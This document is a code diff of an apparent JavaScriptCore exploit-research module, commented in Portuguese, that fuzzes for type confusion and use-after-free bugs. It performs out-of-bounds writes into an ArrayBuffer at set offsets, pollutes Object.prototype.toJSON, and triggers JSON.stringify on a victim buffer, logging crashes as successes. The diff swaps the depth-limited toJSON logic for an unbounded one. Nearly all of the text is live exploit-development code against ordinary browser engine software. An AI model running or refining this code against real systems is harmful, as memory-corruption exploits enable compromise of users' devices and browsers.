@@ -8,8 +8,6 @@ import {
 import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs';
 
 let callCount_toJSON_tc = 0; // Contador global para o toJSON deste módulo
-// Definindo o alvo para retornar um primitivo, baseado no estouro de pilha observado em ~2927
-const RECURSION_DEPTH_TARGET_FOR_PRIMITIVE_RETURN = 2900; 
 
 async function executeSingleJsonTCTest(
     description,
@@ -23,8 +21,7 @@ async function executeSingleJsonTCTest(
     const FNAME_SINGLE_TEST = `executeSingleJsonTCTest<${description}>`;
     logFn(`--- Iniciando Teste Especulativo: ${description} ---`, "test", FNAME_SINGLE_TEST);
     logFn(`   Offset Corrupção: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}, PP: ${enable_pp}, Escrita OOB: ${attemptOOBWrite}, Setup OOB: ${!skipOOBEnvironmentSetup}`, "info", FNAME_SINGLE_TEST);
-    logFn(`   toJSON retornará PRIMITIVO na chamada ${RECURSION_DEPTH_TARGET_FOR_PRIMITIVE_RETURN}.`, "info", FNAME_SINGLE_TEST);
-
+    logFn(`   toJSON usará lógica SIMPLES (Object.keys) SEM controle de profundidade para retorno modificado.`, "info", FNAME_SINGLE_TEST);
 
     callCount_toJSON_tc = 0; // Reseta o contador para cada teste
 
@@ -36,7 +33,7 @@ async function executeSingleJsonTCTest(
         }
     } else {
         logFn("Setup do ambiente OOB pulado para este teste.", "info", FNAME_SINGLE_TEST);
-        if (oob_array_buffer_real) clearOOBEnvironment(); // Garante limpeza se foi setado antes
+        if (oob_array_buffer_real) clearOOBEnvironment();
     }
 
     let victim_ab_size = 64;
@@ -52,64 +49,58 @@ async function executeSingleJsonTCTest(
         if (enable_pp) {
             logFn(`Tentando poluir Object.prototype.${ppKey}...`, "info", FNAME_SINGLE_TEST);
             Object.defineProperty(Object.prototype, ppKey, {
-                value: function() {
+                value: function() { // Lógica SIMPLES para toJSON
                     callCount_toJSON_tc++;
                     const currentOperationThis = this;
-                    const logPrefixToJSON = `toJSON_TC(Call ${callCount_toJSON_tc}, Test: ${description})`;
+                    const logPrefixToJSON = `toJSON_TC_Simple(Call ${callCount_toJSON_tc}, Test: ${description})`;
                     
-                    // Log menos frequente para não poluir demais, exceto perto do alvo
-                    if (callCount_toJSON_tc < 10 || callCount_toJSON_tc % 500 === 0 || callCount_toJSON_tc >= RECURSION_DEPTH_TARGET_FOR_PRIMITIVE_RETURN - 5) {
+                    if (callCount_toJSON_tc < 20 || callCount_toJSON_tc % 500 === 0) { // Log menos frequente
                         logFn(`[[[ ${logPrefixToJSON} INVOCADO ]]]`, 'vuln', FNAME_SINGLE_TEST);
+                        try {
+                             logFn(`    typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, 'info', FNAME_SINGLE_TEST);
+                        } catch(e){}
                     }
-
-                    // Lógica para modificar o retorno em profundidade crítica para uma STRING PRIMITIVA
-                    if (callCount_toJSON_tc === RECURSION_DEPTH_TARGET_FOR_PRIMITIVE_RETURN) {
-                        logFn(`[[[ ${logPrefixToJSON} PROFUNDIDADE CRÍTICA (${RECURSION_DEPTH_TARGET_FOR_PRIMITIVE_RETURN}) ATINGIDA! Retornando string PRIMITIVA. ]]]`, 'warn', FNAME_SINGLE_TEST);
-                        return "primitive_returned_at_critical_depth"; // <<< RETORNO MODIFICADO AQUI
-                    }
-
-                    // Lógica padrão de Object.keys (pode levar ao estouro de pilha se a profundidade não for controlada aqui)
+                    
                     try {
-                        // Verifica se 'this' está corrompido ANTES da profundidade crítica
-                        // Este if é um exemplo, pode precisar de ajustes
-                        if (this && !(this instanceof Object) && callCount_toJSON_tc < RECURSION_DEPTH_TARGET_FOR_PRIMITIVE_RETURN) {
-                             logFn(`[[[ ${logPrefixToJSON} 'this' não é um objeto! Tipo: ${typeof this}. Potencial corrupção. ]]]`, 'critical', FNAME_SINGLE_TEST);
-                             testSucceededSpeculatively = true; // Indica um problema
-                             // Poderia lançar um erro aqui para ser pego abaixo, ou retornar um erro.
-                             return { toJSON_this_corrupted_tc: true, call_count_tc: callCount_toJSON_tc };
+                        // Tentativa de acessar 'this' para ver se ele está corrompido
+                        if (this && !(this instanceof Object)) { // Se não for mais um objeto
+                             logFn(`[[[ ${logPrefixToJSON} 'this' não é um objeto! Tipo: ${typeof this}. Potencial corrupção ANTES de Object.keys. ]]]`, 'critical', FNAME_SINGLE_TEST);
+                             testSucceededSpeculatively = true;
+                             // Retorna um erro para ser pego pelo stringifyResult ou pelo catch externo
+                             return { toJSON_this_corrupted_early_tc: true, call_count_tc: callCount_toJSON_tc, type_of_this: typeof this };
                         }
-
+                        // Se this for null ou undefined Object.keys vai dar throw, o que é bom para o teste
                         const keys = Object.keys(this); 
                         if (callCount_toJSON_tc < 5 || callCount_toJSON_tc % 1000 === 0) { // Log menos frequente
-                           logFn(`[[[ ${logPrefixToJSON} Object.keys OK. Retornando estrutura com chaves. Chaves: [${keys.slice(0,3).join(',')},...] ]]]`, 'info', FNAME_SINGLE_TEST);
+                           logFn(`[[[ ${logPrefixToJSON} Object.keys OK. Retornando estrutura com chaves. #Keys: ${keys.length} ]]]`, 'info', FNAME_SINGLE_TEST);
                         }
-                        return { toJSON_executed_tc: true, keys_tc: keys, call_count_tc: callCount_toJSON_tc };
+                        // Esta é a estrutura que, sem controle, pode levar ao estouro de pilha.
+                        // O objetivo é ver se a escrita OOB causa um crash ANTES disso.
+                        return { toJSON_executed_tc_simple: true, keys_tc_simple: keys, call_count_tc_simple: callCount_toJSON_tc };
                     } catch (e_keys) {
-                        if (callCount_toJSON_tc < RECURSION_DEPTH_TARGET_FOR_PRIMITIVE_RETURN) { // Só loga erro se for antes do retorno primitivo
-                            logFn(`[[[ ${logPrefixToJSON} ERRO em Object.keys(this): ${e_keys.message} ]]]`, 'error', FNAME_SINGLE_TEST);
-                        }
+                        logFn(`[[[ ${logPrefixToJSON} ERRO em Object.keys(this) ou acesso a 'this': ${e_keys.message} ]]]`, 'critical', FNAME_SINGLE_TEST);
                         testSucceededSpeculatively = true; 
-                        return { toJSON_error_tc: true, message_tc: e_keys.message, call_count_tc: callCount_toJSON_tc };
+                        return { toJSON_error_tc_simple: true, message_tc_simple: e_keys.message, call_count_tc_simple: callCount_toJSON_tc };
                     }
                 },
                 writable: true, configurable: true, enumerable: false
             });
             pollutionApplied = true;
-            logFn(`Object.prototype.${ppKey} poluído.`, "good", FNAME_SINGLE_TEST);
+            logFn(`Object.prototype.${ppKey} poluído com lógica SIMPLES.`, "good", FNAME_SINGLE_TEST);
         } else {
             logFn(`Poluição de Object.prototype.${ppKey} DESABILITADA.`, "info", FNAME_SINGLE_TEST);
         }
 
         if (attemptOOBWrite && !skipOOBEnvironmentSetup && oob_array_buffer_real) {
-            const bytes_to_write_for_corruption = 4; // Assumindo 4 bytes para o valor
+            const bytes_to_write_for_corruption = 4;
             if (corruption_offset >= 0 && corruption_offset + bytes_to_write_for_corruption <= oob_array_buffer_real.byteLength) {
                 logFn(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)} do oob_array_buffer_real`, "warn", FNAME_SINGLE_TEST);
                 oob_write_absolute(corruption_offset, value_to_write, bytes_to_write_for_corruption);
             } else {
-                logFn(`AVISO: Offset de corrupção ${toHex(corruption_offset)} inválido (relativo ao buffer OOB de ${oob_array_buffer_real.byteLength} bytes). Escrita OOB não realizada.`, "warn", FNAME_SINGLE_TEST);
+                logFn(`AVISO: Offset de corrupção ${toHex(corruption_offset)} inválido. Escrita OOB não realizada.`, "warn", FNAME_SINGLE_TEST);
             }
         } else if (attemptOOBWrite) {
-            logFn(`AVISO: Escrita OOB solicitada, mas ambiente OOB não configurado, buffer nulo, ou escrita desabilitada. Escrita OOB não realizada.`, "warn", FNAME_SINGLE_TEST);
+            logFn(`AVISO: Escrita OOB solicitada, mas ambiente OOB não configurado/buffer nulo. Escrita OOB não realizada.`, "warn", FNAME_SINGLE_TEST);
         }
 
         await PAUSE_S3(SHORT_PAUSE_S3);
@@ -120,23 +111,20 @@ async function executeSingleJsonTCTest(
             stringifyResult = JSON.stringify(victim_ab);
             logFn(`<<< RETORNO JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME_SINGLE_TEST);
              if (stringifyResult && typeof stringifyResult === 'string') {
-                // Verifica se a string primitiva foi retornada (JSON.stringify a envolverá em aspas)
-                if (stringifyResult === "\"primitive_returned_at_critical_depth\"") {
-                    logFn("toJSON poluído retornou string primitiva em profundidade crítica E FOI USADO, como esperado.", "good", FNAME_SINGLE_TEST);
-                } else if (stringifyResult.includes("toJSON_error_tc:true")) {
-                    logFn("SUCESSO ESPECULATIVO (TC): Erro capturado dentro do toJSON poluído.", "vuln", FNAME_SINGLE_TEST);
+                if (stringifyResult.includes("toJSON_error_tc_simple:true") || stringifyResult.includes("toJSON_this_corrupted_early_tc:true") ) {
+                    logFn("SUCESSO ESPECULATIVO (TC): Erro/Corrupção detectado DENTRO do toJSON poluído (lógica simples).", "vuln", FNAME_SINGLE_TEST);
                     testSucceededSpeculatively = true;
-                } else if (stringifyResult.includes("toJSON_executed_tc:true")) {
-                    logFn("JSON.stringify executou toJSON poluído (lógica padrão), mas sem erro interno aparente.", "good", FNAME_SINGLE_TEST);
-                } else if (stringifyResult.includes("toJSON_this_corrupted_tc:true")) {
-                     logFn("SUCESSO ESPECULATIVO (TC): 'this' corrompido detectado dentro do toJSON poluído.", "vuln", FNAME_SINGLE_TEST);
-                    testSucceededSpeculatively = true;
+                } else if (stringifyResult.includes("toJSON_executed_tc_simple:true")) {
+                    logFn("JSON.stringify executou toJSON poluído (lógica simples) sem erro interno aparente. Verifique se houve estouro de pilha (RangeError) não capturado.", "good", FNAME_SINGLE_TEST);
                 }
             }
         } catch (e) {
-            logFn(`ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}. POTENCIAL UAF/CRASH!`, "critical", FNAME_SINGLE_TEST);
+            logFn(`ERRO CRÍTICO CAPTURADO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}. POTENCIAL UAF/CRASH!`, "critical", FNAME_SINGLE_TEST);
             logFn(`  ---> POTENCIAL TYPE CONFUSION / UAF <--- (Teste: ${description}, Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)})`, "vuln", FNAME_SINGLE_TEST);
             console.error(`JSON.stringify UAF/TC Test Error (${description}):`, e);
+            if (e.name === 'RangeError') { // Especificamente se for o estouro de pilha
+                logFn("DETECTADO RangeError (Estouro de Pilha) durante JSON.stringify!", "error", FNAME_SINGLE_TEST);
+            }
             testSucceededSpeculatively = true;
         }
 
@@ -155,7 +143,7 @@ async function executeSingleJsonTCTest(
             clearOOBEnvironment();
         }
     }
-    logFn(`--- Teste Especulativo Concluído: ${description} (Sucesso Especulativo: ${testSucceededSpeculatively}) ---`, "test", FNAME_SINGLE_TEST);
+    logFn(`--- Teste Especulativo Concluído: ${description} (Sucesso Especulativo: ${testSucceededSpeculatively}, Chamadas toJSON: ${callCount_toJSON_tc}) ---`, "test", FNAME_SINGLE_TEST);
     return testSucceededSpeculatively;
 }
 
@@ -166,10 +154,10 @@ export async function runSpecificJsonTypeConfusionTest(description, corruptionOf
 
 // Função original, pode ser usada para varredura mais ampla se necessário
 export async function testJsonTypeConfusionUAFSpeculative() {
-    logS3("Executando testJsonTypeConfusionUAFSpeculative (varredura original) - foque em runSpecificJsonTypeConfusionTest.", "warn");
-    // Exemplo para chamar o teste com a configuração que antes travava, mas agora com o toJSON modificado
+    logS3("Executando testJsonTypeConfusionUAFSpeculative (chamada de varredura original) - use runSpecificJsonTypeConfusionTest para testes direcionados.", "warn");
+    // Exemplo para chamar o teste com a configuração que antes travava, agora com toJSON SIMPLES
     await runSpecificJsonTypeConfusionTest(
-        "OriginalCrashScenario_With_PrimitiveReturnLogic",
+        "AttemptRecreateOriginalCrash_SimpleToJSONLogic",
         0x70,       // corruptionOffset
         0xFFFFFFFF, // valueToWrite
         true,       // enablePP
